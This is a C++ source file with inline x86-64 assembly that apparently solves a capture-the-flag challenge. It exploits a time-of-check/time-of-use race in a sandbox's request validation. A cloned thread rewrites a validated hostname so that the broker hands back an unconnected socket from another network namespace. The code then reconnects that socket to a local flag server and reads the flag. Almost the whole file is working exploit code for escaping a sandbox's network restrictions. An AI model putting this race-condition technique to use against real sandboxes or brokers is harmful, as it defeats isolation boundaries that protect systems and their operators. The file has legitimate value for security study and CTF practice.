asm(
    "jmp _start                 \n"

    ".global syscall            \n"
    "syscall:                   \n"
    "movq %rdi, %Rax            \n"
    "movq %rsi, %rdi            \n"
    "movq %rdx, %rsi            \n"
    "movq %rcx, %rdx            \n"
    "movq %r8, %r10             \n"
    "movq %r9, %r8              \n"
    "movq 8(%rsp),%r9           \n"
    "syscall                    \n"
    "ret                        \n"

    ".global clone              \n"
    "clone:                     \n"
    "sub    $0x10,%rsi          \n"
    "mov    %rcx,0x8(%rsi)      \n"
    "mov    %rdi,(%rsi)         \n"
    "mov    %rdx,%rdi           \n"
    "mov    %r8,%rdx            \n"
    "mov    %r9,%r8             \n"
    "mov    0x8(%rsp),%r10      \n"
    "mov    $0x38,%eax          \n"
    "syscall                    \n"
    "test   %rax,%rax           \n"
    "je     1f                  \n"
    "retq                       \n"
    "1:                         \n"
    "xor    %ebp,%ebp           \n"
    "pop    %rax                \n"
    "pop    %rdi                \n"
    "callq  *%rax               \n"
    "mov    %rax,%rdi           \n"
    "mov    $0x3c,%eax          \n"
    "syscall                    \n");

#include <linux/sched.h>
#include <netinet/in.h>
#include <syscall.h>
#include <unistd.h>

extern "C"
{
    void _start(void);
    long int syscall(long int __sysno, ...);
    int clone(int (*fn)(void *), void *child_stack, int flags, void *arg);
}

#define write(fd, buf, sz) syscall(SYS_write, fd, buf, sz)
#define read(fd, buf, sz) syscall(SYS_read, fd, buf, sz)
#define recvmsg(fd, msg, flags) syscall(SYS_recvmsg, fd, msg, flags)
#define nanosleep(rqtp, rmtp) syscall(SYS_nanosleep, rqtp, rmtp)
#define connect(fd, addr, addrlen) syscall(SYS_connect, fd, addr, addrlen)
#define mmap(addr, len, prot, flags, fd, off) syscall(SYS_mmap, addr, len, prot, flags, fd, off)
#define exit(code) syscall(SYS_exit, code)

#define MAP_PRIVATE 0x02
#define MAP_ANONYMOUS 0x20

#define PROT_READ 0x01
#define PROT_WRITE 0x02

#define CLONE_VM 0x00000100
#define CLONE_THREAD 0x00010000
#define CLONE_SIGHAND 0x00000800

#define TYPE_CONNECT 0x0
#define TYPE_GET_ENV_DATA 0x01

#define REQUEST_SIZE 0x18
#define RESPONSE_SIZE 0x8
#define COMMS_FD 0x64
#define METADATA_PORT 0x1f90

struct ConnectToMetadataServerRequest
{
    char *hostname;
    uint16_t port;
};

struct ConnectToMetadataServerResponse
{
    bool success;
};

struct GetEnvironmentDataRequest
{
    uint8_t idx;
};

struct GetEnvironmentDataResponse
{
    uint64_t data;
};

namespace Type {
enum type_t {
  Connect = 0,
  GetEnvData = 1,
};
}


struct Request
{
    union {
        ConnectToMetadataServerRequest connect_request;
        GetEnvironmentDataRequest getenvdata_request;
    } req;

    Type::type_t type;
};

struct Response
{
    union {
        ConnectToMetadataServerResponse connect_response;
        GetEnvironmentDataResponse getenvdata_response;
    } res;

    Type::type_t type;
};

static int receive_fd(int comms_fd)
{
    char fd_msg[200];
    cmsghdr *cmsg = reinterpret_cast<cmsghdr *>(fd_msg);

    bool data;
    iovec iov = {&data, sizeof(data)};

    msghdr msg;
    msg.msg_name = nullptr;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg;
    msg.msg_controllen = sizeof(fd_msg);
    msg.msg_flags = 0;

    if (recvmsg(comms_fd, &msg, 0) < 0)
    {
        return -1;
    }

    cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS)
    {
        if (cmsg->cmsg_len == CMSG_LEN(sizeof(int)))
        {
            int *fds = reinterpret_cast<int *>(CMSG_DATA(cmsg));
            return fds[0];
        }
    }

    return -1;
}

int child_func(void *arg)
{
    char *addr;
    struct timespec t = {};

    addr = (char *)arg;

    /* Wait till RequestValidation succeeds. */
    t.tv_sec = 0;
    t.tv_nsec = 300000;
    nanosleep(&t, NULL);

    /* Change hostname. Make sure it is still a valid IPv4 address so that inet_pton doesn't fail.
    The goal is to make `connect` fail as AF_INET STREAM_SOCKETs can be used to connect only once.*/
    addr[0] = '2';
}

void get_the_flag(int fd)
{
    struct sockaddr_in serv_addr = {};
    char buf[0x20];

    /* fd is in unconnected state. Reconnect it to Flag Server. */
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(6666);
    serv_addr.sin_addr.s_addr = htonl(0x7f000001L);

    connect(fd, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr_in));

    read(fd, buf, 0x20);
    write(1, buf, 0x20);
}

void _start(void)
{
    Request req;
    Response resp;

    void *child_stack;
    int fd;

    /* Prepare request in advance, as we gonna fight for race condition. */
    char addr[] = "127.0.0.1";
    req.req.connect_request.hostname = addr;
    req.req.connect_request.port = 8080;
    req.type = Type::Connect;

    /* Spawn thread in same thread group in order to fool SafeRead. */
    child_stack = (void *)mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    clone(child_func, child_stack + 0x1000, CLONE_VM | CLONE_THREAD | CLONE_SIGHAND, addr);

    /* Send request and extract file descriptor. */
    write(COMMS_FD, &req, sizeof(req));
    read(COMMS_FD, &resp, sizeof(resp));
    fd = receive_fd(COMMS_FD);

    /* The received file descriptor should be in unconnected state. Reconnect it to Flag Server. It is possible
    as the socket was created in not our NET NAMESPACE. */
    get_the_flag(fd);

    exit(0);
}
